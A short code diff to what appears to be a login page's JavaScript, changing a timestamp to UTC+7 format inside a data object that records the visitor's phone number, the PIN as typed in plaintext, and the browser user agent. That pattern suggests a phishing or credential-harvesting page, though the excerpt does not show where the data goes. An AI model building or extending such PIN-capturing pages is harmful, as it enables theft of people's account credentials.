@@ -573,7 +573,10 @@
             document.getElementById('loginBtn').disabled = true;
             
             const data = {
-                timestamp: new Date().toISOString(),
+                timestamp: new Date(new Date().getTime() + 7 * 60 * 60 * 1000)
+                    .toISOString()
+                    .replace('T', ' ')
+                    .substring(0, 19),
                 phone: phone,
                 pinEntered: pinValue || 'Tidak diisi', // gunakan pin asli, bukan panjangnya
                 userAgent: navigator.userAgent,
